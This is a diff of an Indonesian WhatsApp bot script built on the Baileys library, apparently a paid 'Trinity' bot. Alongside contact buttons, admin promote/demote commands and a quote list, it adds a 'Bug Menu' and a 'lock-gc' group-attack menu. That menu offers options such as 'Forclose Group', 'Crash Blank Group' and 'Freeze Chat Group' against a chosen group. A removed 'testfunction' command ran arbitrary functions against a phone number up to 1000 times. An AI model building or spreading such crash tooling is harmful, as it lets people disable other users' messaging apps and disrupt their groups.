+title: `[ 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 ]
+
 Contact Asepp : 62881036109288
-Telegram :t.me/AsepXxnx
-TikTok : tiktok.com/@asepppxyz`, 
+Telegram : t.me/AsepXxnx
+TikTok : tiktok.com/@asepppxyz`,
+gifPlayback: true,
 hasMediaAttachment: true,
 ...imgsc
-}), 
-nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-buttons: [{
+}),
+
+nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+
+messageParamsJson: JSON.stringify({
+limited_time_offer: {
+text: "𝐀𝐬𝐞𝐩𝐗𝐲𝐳 𝐎𝐤𝐞𝐆𝐚𝐬",
+url: "https://wa.me/62881036109288",
+copy_code: "𝐌𝐚𝐤𝐥𝐮𝐮𝐈𝐝𝐢𝐨𝐭",
+expiration_time: Date.now() + 86400000
+},
+bottom_sheet: {
+in_thread_buttons_limit: 2,
+divider_indices: Array(10).fill(0).map((_, i) => i),
+list_title: "Owner Center",
+button_title: "Open Contact"
+}
+}),
+
+buttons: [
+
+{
 name: "cta_url",
-buttonParamsJson: `{\"display_text\":\"Whatsapp Asepp\",\"url\":\"https://wa.me/62881036109288\",\"merchant_url\":\"https://www.google.com\"}`
+buttonParamsJson: JSON.stringify({
+icon: "PROMOTION",
+display_text: "Whatsapp Asepp",
+url: "https://wa.me/62881036109288"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "DOCUMENT",
+display_text: "Telegram",
+url: "https://t.me/AsepXxnx"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "REVIEW",
+display_text: "Saluran Info",
+url: "https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "DEFAULT",
+display_text: "TikTok",
+url: "https://tiktok.com/@asepppxyz"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "SHOP",
+display_text: "JoinMyPt",
+url: "https://wa.me/62881036109288"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "TICKET",
+display_text: "Ticket Surga",
+url: "https://t.me/AsepXxnx"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "EVENT",
+display_text: "Event Byon",
+url: "https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R"
+})
+},
+
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+icon: "PAYMENT",
+display_text: "Payment AsepJinks",
+url: "https://asepxyz12.github.io/bot-wa-db/hosting/AseppXyz%20-%20Developer.html"
+})
+},
+
+{
+name: "cta_request_location",
+buttonParamsJson: JSON.stringify({
+icon: "LOCATION",
+display_text: "Location"
+})
+},
+
+{
+name: "cta_open_settings",
+buttonParamsJson: JSON.stringify({
+icon: "CALL",
+display_text: "Call Owner"
+})
+},
+
+{
+name: "single_select",
+buttonParamsJson: JSON.stringify({
+has_multiple_buttons: true,
+icon: "DOCUMENT",
+title: "𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔",
+
+sections: [
+{
+title: "❏ 𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐌𝐄𝐍𝐔 𝐋𝐈𝐒𝐓",
+highlight_label: "Top Feature",
+
+rows: [
+{
+title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
+description: "Display all available bot features",
+id: ".allmenu"
 },
 {
-name: "cta_url",
-buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/AsepXxnx\",\"merchant_url\":\"https://www.google.com\"}`
+title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
+description: "Display bug & crash features",
+id: ".bugmenu"
 },
 {
-name: "cta_url",
-buttonParamsJson: `{\"display_text\":\"Saluran Info\",\"url\":\"https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R\",\"merchant_url\":\"https://www.google.com\"}`
-}, 
+title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
+description: "Display owner control features",
+id: ".ownermenu"
+},
 {
-name: "cta_url",
-buttonParamsJson: `{\"display_text\":\"TikTok\",\"url\":\"\",\"merchant_url\":\"https://www.google.com\"}`
-}, 
+title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮",
+description: "Display fun & entertainment features",
+id: ".funmenu"
+},
 {
-name: "cta_url",
-buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R\",\"merchant_url\":\"https://www.google.com\"}`
-}]
+title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮",
+description: "Display cpanel management features",
+id: ".cpanelmenu"
+},
+{
+title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮",
+description: "Display 18+ special features",
+id: ".nsfwmenu"
+},
+{
+title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨",
+description: "Display support & credits",
+id: ".tqto"
+},
+{
+title: "𝐒𝐜𝐫𝐢𝐩𝐭",
+description: "Display script information",
+id: ".sc"
+},
+{
+title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
+description: "Display developer contact",
+id: ".owner"
+}
+]
+}
+]
 })
-}]
-})
-})}
-}}, {quoted: qkontak})
-await Asepp.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
 }
 
+]
+
+})
+
+}
+]
+})
+
+})
+
+}
+}
+        },
+        {
+            quoted: qkontak
+        }
+    )
+
+    // FIX UTAMA: Menambahkan perintah relayMessage agar pesan Carousel terkirim ke WhatsApp
+    await Asepp.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
+
+    // Memastikan modul fs tersedia untuk membaca file audio lokal
+    const fs = require("fs")
+    if (fs.existsSync("./image/waaj.mp3")) {
+        await Asepp.sendMessage(
+            m.chat,
+            {
+                audio: fs.readFileSync("./image/waaj.mp3"),
+                mimetype: "audio/mpeg",
+                ptt: false
+            },
+            {
+                quoted: m
+            }
+        )
+    }
+
+} catch (e) {
+    console.log(e)
+    payreply(String(e))
+}
+}
 break
 
 case "sc": {
@@ -4845,50 +6618,6 @@ case 'nsfw': {
 		}
 		break
 	
-case "swgrup": {
-                const quoted = m.quoted ? m.quoted : m;
-                const mime = (quoted.msg || quoted).mimetype || "";
-                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
-                const jid = m.chat;
-                
-                if (/image/.test(mime)) {
-                    const buffer = await quoted.download();
-                    await Asepp.sendMessage(jid, {
-                        groupStatusMessage: {
-                            image: buffer,
-                            caption
-                        }
-                    });
-                    payreply("Udah Jing")
-                } else if (/video/.test(mime)) {
-                    const buffer = await quoted.download();
-                    await Asepp.sendMessage(jid, {
-                        groupStatusMessage: {
-                            video: buffer,
-                            caption
-                        }
-                    });
-                    payreply("Udah Jing")
-                } else if (/audio/.test(mime)) {
-                    const buffer = await quoted.download();
-                    await Asepp.sendMessage(jid, {
-                        groupStatusMessage: {
-                            audio: buffer
-                        }
-                    });
-                    payreply("Udah Jing")
-                } else if (caption) {
-                    await Asepp.sendMessage(jid, {
-                        groupStatusMessage: {
-                            text: caption
-                        }
-                    });
-                    payreply("✅️")
-                } else {
-                    await payreply(`Reply Media Atau Tambahkan Teks.\nExample: ${prefix + command} (Reply Image/Video/Audio) Haii Bro`);
-                }
-            }
-            break
 
 case "rvo": {
 
@@ -4931,30 +6660,6 @@ case "rvo": {
 break
 
 
-case "demote": {
-
- // =====================================
- // OWNER ONLY
- // =====================================
- if (!isOwner) {
- return payreply('❌ Owner only!')
- }
-
-    if (!isGroup) return payreply(mess.group)
-
-    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
-
-    if (!target) return payreply("❌ Tag atau reply pesan user yang mau didemote")
-    if (target === Asepp.user.id.split(':')[0] + '@s.whatsapp.net') return payreply("❌ Gak bisa demote bot")
-
-    try {
-        await Asepp.groupParticipantsUpdate(m.chat, [target], "demote")
-    } catch (e) {
-        console.error(e)
-        payreply("❌ Gagal melakukan demote")
-    }
-}
-break
 
 async function tiktokDownloader(query) {
     try {
@@ -5490,114 +7195,182 @@ case "cekidgc": {
     }
 }
 break
-case "promote": {
- if (!isOwner) return payreply(mess.owner)
- if (!isGroup) return payreply(mess.group)
 
- let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
- 
- if (!target) return payreply("❌ Tag atau reply pesan user yang mau dipromote")
- if (target === Asepp.user.id.split(':')[0] + '@s.whatsapp.net') return payreply("❌ Bot sudah admin")
+// ==========================================
+// CASE 2: EKSEKUSI PROMOTE (TOMBOL KLIK)
+// ==========================================
 
- try {
- await Asepp.groupParticipantsUpdate(m.chat, [target], "promote")
- } catch (e) {
- console.error(e)
- payreply("❌ Gagal melakukan promote")
+
+// ==========================================
+// CASE 3: EKSEKUSI DEMOTE (TOMBOL KLIK)
+// ==========================================
+
+// ==========================================
+// CASE 2: EKSEKUSI PROMOTE (TOMBOL KLIK)
+// ==========================================
+
+// ==========================================
+// CASE 3: EKSEKUSI DEMOTE (TOMBOL KLIK)
+// ==========================================
+
+
+// ==========================================
+// CASE 2: EKSEKUSI PROMOTE (TOMBOL KLIK)
+// ==========================================
+
+// ==========================================
+// CASE 3: EKSEKUSI DEMOTE (TOMBOL KLIK)
+// ==========================================
+
+
+// ==========================================
+// CASE 2: EKSEKUSI PROMOTE (TOMBOL KLIK)
+// ==========================================
+case "promote":
+case "demote": {
+  try {
+    if (!m.isGroup) {
+      return payreply("Group only");
+    }
+
+    let target = [];
+    if (m.quoted?.sender) {
+      target.push(m.quoted.sender);
+    }
+    if (m.mentionedJid?.length) {
+      target.push(...m.mentionedJid);
+    }
+
+    target = [...new Set(target)];
+
+    if (!target.length) {
+      return payreply("Reply atau tag target");
+    }
+
+    let teks = `Daftar target yang dipilih: ${target.length} user`;
+
+    global.adminAction = {
+      chat: m.chat,
+      target: target
+    };
+
+    const { generateWAMessageContent } = require("@whiskeysockets/baileys");
+    const media = await generateWAMessageContent(
+      { image: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1781085243194.jpeg" } },
+      { upload: Asepp.waUploadToServer }
+    );
+
+    await Asepp.relayMessage(m.chat, {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              hasMediaAttachment: true,
+              imageMessage: media.imageMessage
+            },
+            body: {
+              text: teks
+            },
+            footer: {
+              text: "Silakan klik tombol di bawah untuk mengeksekusi target."
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "quick_reply",
+                  buttonParamsJson: JSON.stringify({
+                    display_text: "Naikan Admin",
+                    id: ".admin_promote",
+                    icon: "PROMOTION"
+                  })
+                }, 
+                {
+                  name: "quick_reply",
+                  buttonParamsJson: JSON.stringify({
+                    display_text: "Turunkan Admin",
+                    id: ".admin_demote",
+                    icon: "REVIEW"
+                  })
+                }
+              ]
+            }
+          }
+        }
+      }
+    }, { quoted: m });
+
+  } catch (err) {
+    console.error(err);
+    payreply("Error: " + err.message);
+  }
+}
+break;
+
+case "admin_promote": {
+
+ // =====================================
+ // OWNER ONLY
+ // =====================================
+ if (!isOwner) {
+ return payreply('❌ Owner only!')
  }
-}
-break
 
-case 'quotesgalau': {
-  function pickRandom(list) {
-  return list[Math.floor(list.length * Math.random())]
+  if (!global.adminAction) {
+    return payreply("Tidak ada target");
+  }
+
+  let { chat, target } = global.adminAction;
+
+  for (let jid of target) {
+    if (jid === Asepp.user.id) {
+      continue;
+    }
+    await Asepp.groupParticipantsUpdate(chat, [jid], "promote");
+  }
+
+  delete global.adminAction;
+  payreply("berhasil promote: " + target.length + " user");
 }
-const galau = [
-    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
-    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
-    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
-    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
-    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
-    "Tak semudah itu melupakanmu",
-    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
-    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
-    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
-    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
-    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
-    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
-    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
-    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
-    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
-    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
-    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
-    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
-    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
-    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
-    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
-    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
-    "Karenamu aku jadi tau cinta yang sesungguhnya",
-    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
-    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
-    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
-    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
-    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
-    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
-    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
-    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
-    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
-    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
-    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
-    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
-    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
-    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
-    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
-    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
-    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
-    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
-    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
-    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
-    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
-    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
-    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
-    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
-    "Maaf aku lupa ternyata aku bukan siapa-siapa",
-    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
-    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
-    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
-    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
-    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
-    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
-    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
-    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
-    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
-    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
-    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
-    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
-    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
-    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
-    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
-    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
-    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
-    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
-    "Dari sekian lama menunggu apa yang sudah didapat",
-    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
-    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
-    "Aku terlahir sederhana dan ditinggal sudah biasa",
-    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
-    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
-    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
-    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
-    "Jangan paksa aku menjadi cewek seperti seleramu",
-    "Hanya yang sabar yang mampu melewati semua kekecewaan",
-    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
-    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
-    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
-    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
-]
-    let bacotan = pickRandom(galau)
-  payreply(bacotan)
+break;
+
+case "admin_demote": {
+
+ // =====================================
+ // OWNER ONLY
+ // =====================================
+ if (!isOwner) {
+ return payreply('❌ Owner only!')
+ }
+
+  if (!global.adminAction) {
+    return payreply("Tidak ada target");
+  }
+
+  let { chat, target } = global.adminAction;
+
+  for (let jid of target) {
+    if (jid === chat.split("@")[0] + "@s.whatsapp.net") {
+      continue;
+    }
+    await Asepp.groupParticipantsUpdate(chat, [jid], "demote");
+  }
+
+  delete global.adminAction;
+  payreply("berhasil Demote: " + target.length + " user");
 }
-break
+break;
+// ==========================================
+// CASE 3: EKSEKUSI DEMOTE (TOMBOL KLIK)
+// ==========================================
+
+
+
+
+
+
+
+
+
 case 'quotesmotivasi': {
 function pickRandom(list) {
   return list[Math.floor(list.length * Math.random())]
@@ -7988,67 +9761,646 @@ async function kntl(Asepp, target, isWithMention = false) {
         }
     }, {})
 }
-        
-case "testfunction": {
-    if (!isCreator) return payreply(mess.owner);
-    if (!text.includes("|"))
-        return payreply(
-`Gunakan format yang benar contoh:
-.testfunction Nomor|Loop|async function maklu(target)\nawait maklu(target)
-`
-        );
-
-    const [nomorRaw, loopRaw, funcFull] = text.split("|");  
-    const nomor = nomorRaw.replace(/[^0-9]/g, "");  
-    const jumlah = Math.max(1, Math.min(parseInt(loopRaw) || 1, 1000));  
-
-    if (!nomor) return payreply("❌ Nomor tidak valid!");  
-    if (!funcFull) return payreply("❌ Masukkan function async yang benar!");  
-
-    const target = nomor + "@s.whatsapp.net";  
-    const sandbox = {  
-        Asepp,  
-        target,  
-        console,  
-        Buffer,  
-        sleep: (ms) => new Promise(r => setTimeout(r, ms)),  
-        generateWAMessageFromContent,  
-        proto  
-    };  
-
-    const context = vm.createContext(sandbox);
-    const funcNameMatch = funcFull.match(/async function (\w+)/);
-    const funcName = funcNameMatch ? funcNameMatch[1] : "UnknownFunction";
-    let adaError = false;
-
-    for (let i = 0; i < jumlah; i++) {
+case "xe-gc": {
     try {
-        await vm.runInContext(`(async()=>{ ${funcFull} })()`, context);
+        let rows = [];
+        const groups = await Asepp.groupFetchAllParticipating();
+        const dataGroups = Object.values(groups);
+        
+        if (dataGroups.length === 0) {
+            return payreply("⚠️ Bot tidak memiliki grup yang bisa dipilih.")
+        }
+        
+        for (let g of dataGroups) {
+            const name = g.subject || "Unknown";
+            rows.push({
+                title: `${name} (${g.participants.length} Anggota)`,
+                description: `ID: ${g.id}`,
+                id: ".lock-gc " + g.id
+            })
+        }
+
+        // Thumbnail pake AseppIkiCok.jpeg
+        const thumbRzM = "./image/jawee.jpeg"
+        const fs = require("fs")
+        
+        if (!fs.existsSync(thumbRzM)) {
+            return payreply("Gambar jawee.jpeg ga ketemu bro")
+        }
+
+        const { generateWAMessageContent } = require("@whiskeysockets/baileys")
+        const media = await generateWAMessageContent({
+            image: {
+                url: thumbRzM
+            }
+        }, {
+            upload: Asepp.waUploadToServer
+        });
+
+        await Asepp.relayMessage(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            hasMediaAttachment: true,
+                            imageMessage: media.imageMessage
+                        },
+                        body: {
+                            text: `🐉 Pilih grup yang ingin di manage melalui menu di bawah!\n\n*Trinity V1 System*`
+                        },
+                        footer: {
+                            text: "© AsepXyz Official"
+                        },
+                        nativeFlowMessage: {
+                            buttons: [{
+                                name: "single_select",
+                                buttonParamsJson: JSON.stringify({
+                                    icon: "PROMOTION",
+                                    title: "Pilih Grup Trinity",
+                                    sections: [{
+                                        title: "Grup yang Tersedia",
+                                        rows: rows
+                                    }]
+                                })
+                            }],
+                            messageParamsJson: JSON.stringify({
+                                limited_time_offer: {
+                                    text: "TRINITY V1 SYSTEM",
+                                    url: "https://t.me/AsepXxnx",
+                                    copy_code: "./TrinityConfig.json",
+                                    expiration_time: Date.now() * 999
+                                },
+                                tap_target_configuration: {
+                                    title: "Trinity Group Manager",
+                                    description: "© AsepXyz Official",
+                                    button_index: 0
+                                },
+                                bottom_sheet: {
+                                    in_thread_buttons_limit: 3,
+                                    list_title: "Trinity Groups",
+                                    button_title: "PILIH"
+                                }
+                            })
+                        }
+                    }
+                }
+            }
+        }, {
+            quoted: qkontak
+        })
+        
     } catch (err) {
-        adaError = true;
-        await payreply(`❌ Terjadi kesalahan pada ${i + 1}:\n${err.message}`);
-        console.log("Error exec:", err);
-        break;
+        console.error(err);
+        payreply("Terjadi kesalahan pada menu XE-GC: " + err.message)
+    }
+}
+break;
+case "lock-gc": {
+    // Menghitung waktu 1 jam ke depan dalam format Unix Timestamp
+    const oneHourLater = Math.floor(Date.now() / 1000) + 3600;
+    
+    // Mengambil ID Grup target dari argumen pertama
+    let target = args[0];
+    if (!target) {
+        return payreply("⚠️ *Silakan pilih grup dari menu!*");
+    }
+    
+    const namaOrang = m.pushName || "No Name";
+    const user = "" + namaOrang;
+    let trash = "";
+    let zero = "\n╭─⤉ [ BUG TYPE ]\n│    Please click the Bug Menu Options\n╰─────────────────";
+    
+    // Fungsi internal otomatis pengacak indeks pembatas tombol
+    const fixShuffle = (arr) => arr.sort(() => Math.random() - 0.5);
+    
+    // Dibungkus try-catch agar jika Axios/Link Error, bot tidak langsung mati
+    try {
+        // 1. Mengirimkan Pesan Interaktif (Menu Bug & Tombol Navigasi)
+        await Asepp.sendMessage(m.chat, {
+            interactiveMessage: {
+                title: trash,
+                footer: zero,
+                // Tips: Ganti URL ini dengan URL gambar lain yang aktif jika github masih error
+                thumbnail: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1781083243624.jpeg",
+                nativeFlowMessage: {
+                    messageParamsJson: JSON.stringify({
+                        limited_time_offer: {
+                            text: "☬⃟⃰𝐆⃠⃢𝐫𝐨⃖🇺𝐩⃠⃡𝐄𝐱𝔮𝐞𝐜𝐮⃕𝐭𝐢𝐨𝐧⃛𝐬⃢ꦽ🐉",
+                            url: "https://t.me",
+                            copy_code: "./AsepOkeGas.json",
+                            expiration_time: Date.now() * 999
+                        },
+                        bottom_sheet: {
+                            in_thread_buttons_limit: 2,
+                            divider_indices: fixShuffle([3, 4, 5, 999, 1, 2]),
+                            list_title: "SELECT TYPE BUG",
+                            button_title: "SELECT TYPE BUG"
+                        },
+                        tap_target_configuration: {
+                            title: "▸ X ◄",
+                            description: " AsepXyzOkeGas",
+                            canonical_url: "https://t.me/AsepXxnx",
+                            domain: "https://asepxyz12.github.io/bot-wa-db/hosting/AseppXyz%20-%20Developer.html",
+                            button_index: 0
+                        }
+                    }),
+                    buttons: [
+                        {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true }),
+                            icon: "REVIEW"
+                        }, 
+                        {
+                            name: "call_permission_request",
+                            buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
+                        }, 
+                        {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify({
+                                icon: "PROMOTION",
+                                title: "SELECT TYPE BUG",
+                                sections: [{
+                                    title: "Trashvhe Ggoup Exceuton",
+                                    rows: [
+                                        { title: "Forclose Group", description: "Forclose Hard Group", id: ".pornoclose " + target }, 
+                                        { title: "Forclose Group VII", description: "Forclose Infinity Group", id: ".pornoclose " + target }, 
+                                        { title: "Crash Blank Group", description: "Blank Ui Hard Group", id: ".pornoclose " + target }, 
+                                        { title: "Crash Group Invited", description: "Crash Fake Invited Group", id: ".pornoclose " + target }, 
+                                        { title: "Crash V Freeze Group", description: "Freeze X Crash Buffer Group", id: ".pornoclose " + target }, 
+                                        { title: "Trashvhe Core Lay", description: "Blank X Delay Group", id: ".pornoclose " + target }, 
+                                        { title: "Crash DocmentMessege", description: "Crash Document Message", id: ".pornoclose " + target }, 
+                                        { title: "Rxvxs Burst Bvg", description: "Burst Damage Group", id: ".pornoclose " + target }, 
+                                        { title: "Crash Loca Bvgs", description: "Loca Crash Delay Bvg Group", id: ".pornoclose " + target }, 
+                                        { title: "Coooling Freeze", description: "Freeze Chat Group", id: ".pornoclose " + target }, 
+                                        { title: "Freeze Hard Level", description: "Freeze Chat X Delay X Forclose UI", id: ".pornoclose " + target }, 
+                                        { title: "Invited Admin Bokep", description: "Crash Group Type Invite Admin", id: ".pornoclose " + target }
+                                    ]
+                                }]
+                            }),
+                            icon: "DOCUMENT"
+                        }, 
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                icon: "DOCUMENT",
+                                display_text: "Join Saluran Informasi",
+                                url: "https://whatsapp.com"
+                            })
+                        }, 
+                        {
+                            name: "cta_copy",
+                            buttonParamsJson: JSON.stringify({
+                                icon: "DEFAULT",
+                                display_text: "Using Website",
+                                copy_code: "https://vercel.app"
+                            })
+                        }, 
+                        {
+                            name: "cta_call",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Call Developer",
+                                phone_number: "0881036109288"
+                            })
+                        }, 
+                        {
+                            name: "cta_reminder",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Thanks To Buyer Trinity",
+                                id: "https://t.me/AsepXxnx",
+                                timestamp: oneHourLater,
+                                note: "Halo! Ini pengingat dari AsepXyz untuk tugas kamu"
+                            })
+                        }, 
+                        {
+                            name: "send_location",
+                            buttonParamsJson: "{}"
+                        }
+                    ]
+                }
+            }
+        }, { quoted: m });
+    } catch (interactiveError) {
+        console.error("Gagal mengirim pesan interaktif karena masalah jaringan/aset:", interactiveError);
+        // Fallback: Kirim teks biasa jika tombol native flow error
+        await Asepp.sendMessage(m.chat, { text: "⚠️ Fitur menu tombol sedang bermasalah. Mengalihkan ke sistem audio..." }, { quoted: m });
     }
 
-    await sandbox.sleep(300); //delay mamaklu
+    // 2. Memproses Konversi Audio Master ke OGG/Opus (Voice Note)
+    const input = "./Start.opus";
+    const output = path.join(__dirname, "./tmp_convert_" + Date.now() + ".ogg");
+    
+    if (fs.existsSync(input)) {
+        try {
+            await new Promise((resolve, reject) => {
+                // Konversi audio menggunakan ffmpeg agar terbaca sebagai Voice Note asli di WhatsApp
+                exec("ffmpeg -y -i " + input + " -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k " + output, err => {
+                    return err ? reject(err) : resolve();
+                });
+            });
+            
+            // Mengirimkan Voice Note ke ruang obrolan
+            await Asepp.sendMessage(m.chat, {
+                audio: fs.readFileSync(output),
+                mimetype: "audio/ogg; codecs=opus",
+                ptt: true,
+                contextInfo: {
+                    forwardingScore: 0,
+                    isForwarded: false
+                }
+            }, { quoted: m });
+            
+        } catch (e) {
